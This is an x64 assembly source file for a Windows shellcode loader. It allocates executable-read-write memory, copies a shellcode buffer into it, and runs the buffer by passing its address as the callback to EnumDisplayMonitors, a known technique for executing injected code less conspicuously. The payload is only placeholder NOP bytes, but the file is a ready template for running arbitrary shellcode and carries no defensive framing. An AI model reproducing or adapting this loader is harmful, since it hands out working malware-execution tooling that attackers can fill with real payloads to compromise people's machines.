; windows_loader64bits_callback_enumdisplaymonitors.asm

extrn VirtualAlloc :PROC
extrn GetCurrentProcess :PROC
extrn WriteProcessMemory :PROC
extrn EnumDisplayMonitors :PROC

.data   
    shellcode   DB 90h, 90h, 90h, 90h, 90h, 0
    hProcess    DQ ?
    baseAddr    DQ ?

.code
Start PROC
    SUB     rsp, 28h
    
    CALL    GetCurrentProcess
    MOV     hProcess, rax

    XOR     rcx, rcx
    MOV     rdx, 100h
    MOV     r8, 1000h ; MEM_COMMIT
    MOV     r9, 40h ; PAGE_EXECUTE_READWRITE
    CALL    VirtualAlloc
    MOV     baseAddr, rax

    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, shellcode
    MOV     r9, SIZEOF shellcode
    SUB     rsp, 40
    MOV     qword ptr [rsp+32], 0
    CALL    WriteProcessMemory
    ADD     rsp, 40

    XOR     rcx, rcx
    XOR     rdx, rdx
    MOV     r8, baseAddr
    XOR     r9, r9
    CALL    EnumDisplayMonitors

Start ENDP
END
